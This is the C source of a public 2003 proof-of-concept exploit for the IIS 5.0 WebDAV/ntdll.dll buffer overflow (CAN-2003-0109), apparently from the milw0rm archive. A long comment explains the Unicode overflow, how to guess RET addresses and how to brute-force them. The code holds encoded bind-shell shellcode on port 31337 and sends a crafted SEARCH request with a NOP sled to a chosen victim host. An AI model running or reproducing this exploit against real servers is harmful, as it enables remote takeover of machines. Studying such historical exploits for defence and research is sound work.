/*************************************/
/* IIS 5.0 WebDAV -Proof of concept- */
/* [ Bug: CAN-2003-0109 ] */
/* By Roman Medina-Heigl Hernandez */
/* aka RoMaNSoFt <roman@rs-labs.com> */
/* Madrid, 23.Mar.2003 */
/* ================================= */
/* Public release. Version 1. */
/* --------------------------------- */
/*************************************/
/* ====================================================================
* --[ READ ME ]
*
* This exploit is mainly a proof of concept of the recently discovered ntdll.dll bug (which may be
* exploited in many other programs, not necessarily IIS). Practical exploitation is not as easy as
* expected due to difficult RET guessing mixed with possible IIS crashes (which makes RET brute
* forcing a tedious work). The shellcode included here will bind a cmd.exe shell to a given port
* at the victim machine so it could be problematic if that machine is protected behind a firewall.
* For all these reasons, the scope of this code is limited and mainly intended for educational
* purposes. I am not responsible of possible damages created by the use of this exploit code.
*
* The program sends a HTTP request like this:
*
* SEARCH /[nop] [ret][ret][ret] ... [ret] [nop][nop][nop][nop][nop] ... [nop] [jmpcode] HTTP/1.1
* {HTTP headers here}
* {HTTP body with webDAV content}
* 0x01 [shellcode]
*
* IIS converts the first ascii string ([nop]...[jmpcode]) to Unicode using UTF-16 encoding (for
* instance, 0x41 becomes 0x41 0x00, i.e. an extra 0x00 byte is added) and it is the resultant
* Unicode string the one producing the overflow. So at first glance, we cannot include code here
* (more on this later) because it would get corrupted by 0x00 (and other) inserted bytes. Not at
* least using the common method. Another problem that we will have to live with is our RET value
* being padded with null bytes, so if we use 0xabcd in our string, the real RET value (i.e. the
* one EIP will be overwritten with) would be 0x00ab00cd. This is an important restriction.
*
* We have two alternatives:
*
* 1) The easy one: find any occurrences of our ascii string (i.e. before it gets converted to
* the Unicode form) in process memory. Problem: normally we should find it by debugging the
* vulnerable application and then hardcode the found address (which will be the RET address)
* in our exploit code. This RET address is variable, even for the same version of OS and app
* (I mean, different instances of the same application in the same machine could make the
* guessed RET address invalid at different moments). Now add the restriction of RET value
* padded with null-bytes. Anyway, the main advantage of this method is that we will not have
* to deal with 0x00-padded shellcode.
*
* 2) The not so-easy one: you could insert an encoded shellcode in such a way that when the app
* expands the ascii string (with the encoded shellcode) to Unicode, a valid shellcode is
* automagically placed into memory. Please, refer to Chris Anley's "venetian exploit" paper
* to read more about this. Dave Aitel also has a good paper about this technique and indeed
* he released code written in Python to encode shellcode (I'm wondering if he will release a
* working tool for that purpose, since the actual code was released as part of a commercial
* product, so it cannot be run without buying the whole product, despite the module itself
* being free!). Problem: it is not so easy as the first method ;-) Advantage: when the over-
* flow happens, some registers may point to our Unicoded string (where our Unicoded-shellcode
* lives in), so we don't need to guess the address where shellcode will be placed and the
* chance of a successful exploitation is greatly improved. For instance, in this case, when
* IIS is overflowed, ECX register points to the Unicode string. The idea is then fill in
* RET value with the fixed address of code like "call %ecx". This code may be contained in
* any previosly-loaded library, for example).
*
* Well, guess it... yes... I chose the easy method :-) Perhaps I will rewrite the exploit
* using method 2, but I cannot promise that.
*
* Let's see another problem of the method 1 (which I have used). Not all Unicode conversions
* result in a 0x00 byte being added. This is true for ascii characters lower or equal to 0x7f
* (except for some few special characters, I'm not sure). But our shellcode will have bytes
* greater than 0x7f value. So we don't know the exact length of the Unicoded-string containing
* our shellcode (some ascii chars will expand to more than 2 bytes, I think). As a result,
* sometimes the exploit may not work, because no exact length is matched. For instance, if you
* carry out experiments on this issue, you could see that IIS crashes (overflow occurs) when
* entering a query like SEARCH /AAAA...AAA HTTP/1.1, with 65535 A's. Same happens with 65536.
* But with different values seems NOT to work. So matching the exact length is important here!
*
* What I have done, it is to include a little "jumpcode" instead of the shellcode itself. The
* jumpcode is placed into the "critical" place and has a fixed length, so our string has always
* a fixed length, too. The "variable" part (the shellcode) is placed at the end of the HTTP
* request (so you can insert your own shellcode and remove the one I'm using here, with no apparent
* problem). To be precise, the end of the request will be: 0x01 [shellcode]. The 0x01 byte marks
* the beginning of the shellcode and it is used by the jumpcode to find the address where shell-
* code begins and jump into it. It is not possible to hardcode a relative jump, because HTTP
* headers have a variable length (think about the "Host:" header and you will understand what
* I'm saying). Well, really, the exploit could have calculated the relative jump itself (other
* problems arise like null-bytes possibly contained in the offset field) but I have prefered to
* use the 0x01 trick. It's my exploit, it's my choice :-)
*
* After launching the exploit, several things may happen:
* - the exploit is successful. You can connect to the bound port of victim machine and get a
* shell. Great. Remember that when you issue an "exit" command in the shell prompt, the pro-
* cess will be terminated. This implies that IIS could die.
* - exploit returns a "server not vulnerable" response. Really, the server may not be vulnerable
* or perhaps the SEARCH method used by the exploit is not permitted (the bug can still be
* exploited via GET, probably) or webDAV is disabled at all.
* - exploit did not get success (which is not strange, since it is not easy to guess RET value)
* but the server is vulnerable. IIS will probably not survive: a "net start w3svc" could be
* needed in the victim machine, in order to restart the WWW service.
*
* The following log shows a correct exploitation:
*
* roman@goliat:~/iis5webdav> gcc -o rs_iis rs_iis.c
* roman@goliat:~/iis5webdav> ./rs_iis roman
* [*] Resolving hostname ...
* [*] Attacking port 80 at roman (EIP = 0x00480004)...
* [*] Now open another console/shell and try to connect (telnet) to victim port 31337...
*
* roman@goliat:~/iis5webdav> telnet roman 31337
* Trying 192.168.0.247...
* Connected to roman.
* Escape character is '^]'.
* Microsoft Windows 2000 [Versi¢n 5.00.2195]
* (C) Copyright 1985-2000 Microsoft Corp.
*
* C:\WINNT\system32>
*
*
* I am not going to show logs for the faulty cases. I'm pretty sure you will see them very
* soon :-) But yes, the exploit works, perhaps a little fine-tunning may be required, though.
* So please, do NOT contact me telling that the exploit doesn't work or things like that. It
* worked for me and it will work for you, if you're not a script-kiddie. Try to attach to the
* IIS process (inetinfo.exe) with the help of a debugger (OllyDbg is my favourite) on the
* victim machine and then launch the exploit against it. Debugger will break when the first
* exception is produced. Now place a breakpoint in 0x00ab00cd (being 0xabcd the not-unicoded
* RET value) and resume execution until you reach that point. Finally, it's time to search
* the memory looking for our shellcode. It is nearly impossible (very low chance) that our
* shellcode is found at any 0x00**00**-form address (needed to bypass the RET restriction
* imposed by Unicode conversion) but no problem: you have a lot of NOPs before the shellcode
* where you could point to. If EIP is overwritten with the address of such a NOP, program flow
* will finish reaching our shellcode. Note also that among the two bytes of RET that we have some
* kind of control, the more important is the first one, i.e. the more significant. In other
* words, interesting RET values to try are: 0x0104, 0x0204, 0x0304, 0x0404, 0x0504, ...,
* and so on, till 0xff04. As you may have noticed, the last byte (0x04) is never changed because
* its weight is minimal (256 between aprox. 65000 NOP's is not appreciable).
*
*
* My best wishes,
* --Roman
*
* ===================================== --[ EOT ]-- ====================
*/


#include <stdio.h>
#include <errno.h>
#include <string.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>
#include <netinet/in.h>

// Change to fit your need
#define RET 0x4804 // EIP = 0x00480004
#define LOADLIBRARYA 0x0100107c
#define GETPROCADDRESS 0x01001034

// Don't change this
#define PORT_OFFSET 1052
#define LOADL_OFFSET 798
#define GETPROC_OFFSET 815
#define NOP 0x90
#define MAXBUF 100000


/*
* LoadLibraryA IT Address := 0100107C
* GetProcAddress IT Address := 01001034
*/

unsigned char shellcode[] = // Deepzone shellcode
"\x68\x5e\x56\xc3\x90\x54\x59\xff\xd1\x58\x33\xc9\xb1\x1c"
"\x90\x90\x90\x90\x03\xf1\x56\x5f\x33\xc9\x66\xb9\x95\x04"
"\x90\x90\x90\xac\x34\x99\xaa\xe2\xfa\x71\x99\x99\x99\x99"
"\xc4\x18\x74\x40\xb8\xd9\x99\x14\x2c\x6b\xbd\xd9\x99\x14"
"\x24\x63\xbd\xd9\x99\xf3\x9e\x09\x09\x09\x09\xc0\x71\x4b"
"\x9b\x99\x99\x14\x2c\xb3\xbc\xd9\x99\x14\x24\xaa\xbc\xd9"
"\x99\xf3\x93\x09\x09\x09\x09\xc0\x71\x23\x9b\x99\x99\xf3"
"\x99\x14\x2c\x40\xbc\xd9\x99\xcf\x14\x2c\x7c\xbc\xd9\x99"
"\xcf\x14\x2c\x70\xbc\xd9\x99\xcf\x66\x0c\xaa\xbc\xd9\x99"
"\xf3\x99\x14\x2c\x40\xbc\xd9\x99\xcf\x14\x2c\x74\xbc\xd9"
"\x99\xcf\x14\x2c\x68\xbc\xd9\x99\xcf\x66\x0c\xaa\xbc\xd9"
"\x99\x5e\x1c\x6c\xbc\xd9\x99\xdd\x99\x99\x99\x14\x2c\x6c"
"\xbc\xd9\x99\xcf\x66\x0c\xae\xbc\xd9\x99\x14\x2c\xb4\xbf"
"\xd9\x99\x34\xc9\x66\x0c\xca\xbc\xd9\x99\x14\x2c\xa8\xbf"
"\xd9\x99\x34\xc9\x66\x0c\xca\xbc\xd9\x99\x14\x2c\x68\xbc"
"\xd9\x99\x14\x24\xb4\xbf\xd9\x99\x3c\x14\x2c\x7c\xbc\xd9"
"\x99\x34\x14\x24\xa8\xbf\xd9\x99\x32\x14\x24\xac\xbf\xd9"
"\x99\x32\x5e\x1c\xbc\xbf\xd9\x99\x99\x99\x99\x99\x5e\x1c"
"\xb8\xbf\xd9\x99\x98\x98\x99\x99\x14\x2c\xa0\xbf\xd9\x99"
"\xcf\x14\x2c\x6c\xbc\xd9\x99\xcf\xf3\x99\xf3\x99\xf3\x89"
"\xf3\x98\xf3\x99\xf3\x99\x14\x2c\xd0\xbf\xd9\x99\xcf\xf3"
"\x99\x66\x0c\xa2\xbc\xd9\x99\xf1\x99\xb9\x99\x99\x09\xf1"
"\x99\x9b\x99\x99\x66\x0c\xda\xbc\xd9\x99\x10\x1c\xc8\xbf"
"\xd9\x99\xaa\x59\xc9\xd9\xc9\xd9\xc9\x66\x0c\x63\xbd\xd9"
"\x99\xc9\xc2\xf3\x89\x14\x2c\x50\xbc\xd9\x99\xcf\xca\x66"
"\x0c\x67\xbd\xd9\x99\xf3\x9a\xca\x66\x0c\x9b\xbc\xd9\x99"
"\x14\x2c\xcc\xbf\xd9\x99\xcf\x14\x2c\x50\xbc\xd9\x99\xcf"
"\xca\x66\x0c\x9f\xbc\xd9\x99\x14\x24\xc0\xbf\xd9\x99\x32"
"\xaa\x59\xc9\x14\x24\xfc\xbf\xd9\x99\xce\xc9\xc9\xc9\x14"
"\x2c\x70\xbc\xd9\x99\x34\xc9\x66\x0c\xa6\xbc\xd9\x99\xf3"
"\xa9\x66\x0c\xd6\xbc\xd9\x99\x72\xd4\x09\x09\x09\xaa\x59"
"\xc9\x14\x24\xfc\xbf\xd9\x99\xce\xc9\xc9\xc9\x14\x2c\x70"
"\xbc\xd9\x99\x34\xc9\x66\x0c\xa6\xbc\xd9\x99\xf3\xc9\x66"
"\x0c\xd6\xbc\xd9\x99\x1a\x24\xfc\xbf\xd9\x99\x9b\x96\x1b"
"\x8e\x98\x99\x99\x18\x24\xfc\xbf\xd9\x99\x98\xb9\x99\x99"
"\xeb\x97\x09\x09\x09\x09\x5e\x1c\xfc\xbf\xd9\x99\x99\xb9"
"\x99\x99\xf3\x99\x12\x1c\xfc\xbf\xd9\x99\x14\x24\xfc\xbf"
"\xd9\x99\xce\xc9\x12\x1c\xc8\xbf\xd9\x99\xc9\x14\x2c\x70"
"\xbc\xd9\x99\x34\xc9\x66\x0c\xde\xbc\xd9\x99\xf3\xc9\x66"
"\x0c\xd6\xbc\xd9\x99\x12\x1c\xfc\xbf\xd9\x99\xf3\x99\xc9"
"\x14\x2c\xc8\xbf\xd9\x99\x34\xc9\x14\x2c\xc0\xbf\xd9\x99"
"\x34\xc9\x66\x0c\x93\xbc\xd9\x99\xf3\x99\x14\x24\xfc\xbf"
"\xd9\x99\xce\xf3\x99\xf3\x99\xf3\x99\x14\x2c\x70\xbc\xd9"
"\x99\x34\xc9\x66\x0c\xa6\xbc\xd9\x99\xf3\xc9\x66\x0c\xd6"
"\xbc\xd9\x99\xaa\x50\xa0\x14\xfc\xbf\xd9\x99\x96\x1e\xfe"
"\x66\x66\x66\xf3\x99\xf1\x99\xb9\x99\x99\x09\x14\x2c\xc8"
"\xbf\xd9\x99\x34\xc9\x14\x2c\xc0\xbf\xd9\x99\x34\xc9\x66"
"\x0c\x97\xbc\xd9\x99\x10\x1c\xf8\xbf\xd9\x99\xf3\x99\x14"
"\x24\xfc\xbf\xd9\x99\xce\xc9\x14\x2c\xc8\xbf\xd9\x99\x34"
"\xc9\x14\x2c\x74\xbc\xd9\x99\x34\xc9\x66\x0c\xd2\xbc\xd9"
"\x99\xf3\xc9\x66\x0c\xd6\xbc\xd9\x99\xf3\x99\x12\x1c\xf8"
"\xbf\xd9\x99\x14\x24\xfc\xbf\xd9\x99\xce\xc9\x12\x1c\xc8"
"\xbf\xd9\x99\xc9\x14\x2c\x70\xbc\xd9\x99\x34\xc9\x66\x0c"
"\xde\xbc\xd9\x99\xf3\xc9\x66\x0c\xd6\xbc\xd9\x99\x70\x20"
"\x67\x66\x66\x14\x2c\xc0\xbf\xd9\x99\x34\xc9\x66\x0c\x8b"
"\xbc\xd9\x99\x14\x2c\xc4\xbf\xd9\x99\x34\xc9\x66\x0c\x8b"
"\xbc\xd9\x99\xf3\x99\x66\x0c\xce\xbc\xd9\x99\xc8\xcf\xf1"
"\xe5\x89\x99\x98\x09\xc3\x66\x8b\xc9\xc2\xc0\xce\xc7\xc8"
"\xcf\xca\xf1\xad\x89\x99\x98\x09\xc3\x66\x8b\xc9\x35\x1d"
"\x59\xec\x62\xc1\x32\xc0\x7b\x70\x5a\xce\xca\xd6\xda\xd2"
"\xaa\xab\x99\xea\xf6\xfa\xf2\xfc\xed\x99\xfb\xf0\xf7\xfd"
"\x99\xf5\xf0\xea\xed\xfc\xf7\x99\xf8\xfa\xfa\xfc\xe9\xed"
"\x99\xea\xfc\xf7\xfd\x99\xeb\xfc\xfa\xef\x99\xfa\xf5\xf6"
"\xea\xfc\xea\xf6\xfa\xf2\xfc\xed\x99\xd2\xdc\xcb\xd7\xdc"
"\xd5\xaa\xab\x99\xda\xeb\xfc\xf8\xed\xfc\xc9\xf0\xe9\xfc"
"\x99\xde\xfc\xed\xca\xed\xf8\xeb\xed\xec\xe9\xd0\xf7\xff"
"\xf6\xd8\x99\xda\xeb\xfc\xf8\xed\xfc\xc9\xeb\xf6\xfa\xfc"
"\xea\xea\xd8\x99\xc9\xfc\xfc\xf2\xd7\xf8\xf4\xfc\xfd\xc9"
"\xf0\xe9\xfc\x99\xde\xf5\xf6\xfb\xf8\xf5\xd8\xf5\xf5\xf6"
"\xfa\x99\xcb\xfc\xf8\xfd\xdf\xf0\xf5\xfc\x99\xce\xeb\xf0"
"\xed\xfc\xdf\xf0\xf5\xfc\x99\xca\xf5\xfc\xfc\xe9\x99\xda"
"\xf5\xf6\xea\xfc\xd1\xf8\xf7\xfd\xf5\xfc\x99\xdc\xe1\xf0"
"\xed\xc9\xeb\xf6\xfa\xfc\xea\xea\x99\xda\xf6\xfd\xfc\xfd"
"\xb9\xfb\xe0\xb9\xe5\xc3\xf8\xf7\xb9\xa5\xf0\xe3\xf8\xf7"
"\xd9\xfd\xfc\xfc\xe9\xe3\xf6\xf7\xfc\xb7\xf6\xeb\xfe\xa7"
"\x9b\x99\x86\xd1\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99"
"\x99\x99\x95\x99\x99\x99\x99\x99\x99\x99\x98\x99\x99\x99"
"\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99"
"\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99"
"\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99"
"\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99"
"\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99"
"\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99"
"\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99"
"\x99\x99\xda\xd4\xdd\xb7\xdc\xc1\xdc\x99\x99\x99\x99\x99"
"\x89\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99"
"\x99\x99\x99\x99\x99\x99\x90\x90\x90\x90\x90\x90\x90\x90";

unsigned char jumpcode[] = "\x8b\xf9\x32\xc0\xfe\xc0\xf2\xae\xff\xe7";
/* mov edi, ecx
* xor al, al
* inc al
* repnz scasb
* jmp edi
*/

char body[] = "<?xml version=\"1.0\"?>\r\n<g:searchrequest xmlns:g=\"DAV:\">\r\n" \
"<g:sql>\r\nSelect \"DAV:displayname\" from scope()\r\n</g:sql>\r\n</g:searchrequest>\r\n";


/* Our code starts here */
int main (int argc, char **argv)
{

unsigned long ret;
unsigned short port;
int tport, bport, s, i, j, r, rt=0;
struct hostent *h;
struct sockaddr_in dst;
char buffer[MAXBUF];

if (argc < 2 || argc > 5)
{
printf("IIS 5.0 WebDAV Exploit by RoMaNSoFt <roman@rs-labs.com>. 23/03/2003\nUsage: %s <target host> [target port] [bind port] [ret]\nE.g 1: %s victim.com\nE.g 2: %s victim.com 80 31337 %#.4x\n", argv[0], argv[0], argv[0], RET);
exit(-1);
}

// Default target port = 80
if (argc > 2)
tport = atoi(argv[2]);
else
tport = 80;

// Default bind port = 31337
if (argc > 3)
bport = atoi(argv[3]);
else
bport = 31337;

// Default ret value = RET
if (argc > 4)
ret = strtoul(argv[4], NULL, 16);
else
ret = RET;

if ( ret > 0xffff || (ret & 0xff) == 0 || (ret & 0xff00) == 0 )
{
fprintf(stderr, "RET value must be in 0x0000-0xffff range and it may not contain null-bytes\nAborted!\n");
exit(-2);
}

// Shellcode patching
port = htons(bport);
port ^= 0x9999;

if ( ((port & 0xff) == 0) || ((port & 0xff00) == 0) )
{
fprintf(stderr, "Binding-port contains null-byte. Use another port.\nAborted!\n");
exit(-3);
}

*(unsigned short *)&shellcode[PORT_OFFSET] = port;
*(unsigned long *)&shellcode[LOADL_OFFSET] = LOADLIBRARYA ^ 0x99999999;
*(unsigned long *)&shellcode[GETPROC_OFFSET] = GETPROCADDRESS ^ 0x99999999;
// If the last two items contain any null-bytes, exploit will fail.
// WARNING: this check is not performed here. Be careful and check it for yourself!

// Resolve hostname
printf("[*] Resolving hostname ...\n");
if ((h = gethostbyname(argv[1])) == NULL)
{
fprintf(stderr, "%s: unknown hostname\n", argv[1]);
exit(-4);
}

bcopy(h->h_addr, &dst.sin_addr, h->h_length);
dst.sin_family = AF_INET;
dst.sin_port = htons(tport);

// Socket creation
if ((s = socket(AF_INET, SOCK_STREAM, 0)) == -1)
{
perror("Failed to create socket");
exit(-5);
}

// Connection
if (connect(s, (struct sockaddr *)&dst, sizeof(dst)) == -1)
{
perror("Failed to connect");
exit(-6);
}

// Build malicious string...
printf("[*] Attacking port %i at %s (EIP = %#.4x%.4x)...\n", tport, argv[1], ((ret >> 8) & 0xff), ret & 0xff);

bzero(buffer, MAXBUF);
strcpy(buffer, "SEARCH /");

i = strlen(buffer);
buffer[i] = NOP; // Align for RET overwrite

// Normally, EIP will be overwritten with buffer[8+2087] but I prefer to fill some more bytes ;-)
for (j=i+1; j < i+2150; j+=2)
*(unsigned short *)&buffer[j] = (unsigned short)ret;

// The rest is padded with NOP's. RET address should point to this zone!
for (; j < i+65535-strlen(jumpcode); j++)
buffer[j] = NOP;

// Then we skip the body of the HTTP request
memcpy(&buffer[j], jumpcode, strlen(jumpcode));

strcpy(buffer+strlen(buffer), " HTTP/1.1\r\n");
sprintf(buffer+strlen(buffer), "Host: %s\r\nContent-Type: text/xml\r\nContent-Length: %d\r\n\r\n", argv[1], strlen(body) + strlen(shellcode));
strcpy(buffer+strlen(buffer), body);

// This byte is used to mark the beginning of the shellcode
memset(buffer+strlen(buffer), 0x01, 1);

// And finally, we land into our shellcode
memset(buffer+strlen(buffer), NOP, 3);
strcpy(buffer+strlen(buffer), shellcode);

// Send request
if (send(s, buffer, strlen(buffer), 0) != strlen(buffer))
{
perror("Failed to send");
exit(-7);
}

printf("[*] Now open another console/shell and try to connect (telnet) to victim port %i...\n", bport);

// Receive response
while ( (r=recv(s, &buffer[rt], MAXBUF-1, 0)) > 0)
rt += r;
// This code is not bullet-proof. An evil WWW server could return a response bigger than MAXBUF
// and an overflow would occur here. Yes, I'm lazy... :-)

buffer[rt] = '\0';

if (rt > 0)
printf("[*] Victim server issued the following %d bytes of response:\n--\n%s\n--\n[*] Server NOT vulnerable!\n", rt, buffer);
else
printf("[*] Server is vulnerable but the exploit failed! Change RET value (e.g. 0xce04) and try again (when IIS is up again) :-/\n", bport);

close(s);

}

// milw0rm.com [2003-03-24]